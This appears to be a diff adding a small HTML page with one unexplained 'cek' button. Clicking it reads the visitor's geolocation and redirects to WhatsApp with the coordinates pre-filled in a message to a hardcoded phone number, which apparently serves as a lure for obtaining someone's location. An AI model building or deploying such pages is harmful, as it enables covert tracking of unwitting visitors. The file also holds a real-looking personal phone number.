@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cek</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+            background-color: #f4f4f9;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 8px;
+            box-shadow: 0 4px #1da955;
+        }
+
+        button:active {
+            box-shadow: 0 2px #1da955;
+            transform: translateY(2px);
+        }
+
+        button:hover {
+            background-color: #22c35e;
+        }
+    </style>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendCoordinates);
+            } else {
+                alert("Geolocation tidak didukung oleh browser ini.");
+            }
+        }
+
+        function sendCoordinates(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var waNumber = "6289526335486";
+            var coordinates = `${latitude},${longitude}`;
+            var waUrl = `https://wa.me/${waNumber}?text=${encodeURIComponent(coordinates)}`;
+
+            // Redirect ke WhatsApp dengan koordinat
+            window.location.href = waUrl;
+        }
+    </script>
+</head>
+<body>
+    <h1>cek</h1>
+    <button onclick="getLocation()">cek</button>
+</body>
+</html>
